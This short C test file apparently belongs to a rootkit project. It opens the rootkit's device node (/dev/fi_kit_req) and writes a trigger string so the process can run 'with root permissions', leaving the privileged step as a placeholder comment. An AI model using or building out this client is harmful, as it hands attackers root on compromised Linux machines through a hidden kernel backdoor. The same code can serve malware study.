/*
Example test file no.1
Execute instructions with root permissions.

Author: 0x44F
*/

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/fcntl.h>

#define ROOTKIT "/dev/fi_kit_req"

int main(int argc, char **argv)
{
    int fd = open(ROOTKIT, O_RDWR);

    if(fd < 0)
        return -1;

    write(fd, "fi_kit_req", 7);
    // do something.
    close(fd);
    
    return 0;
}
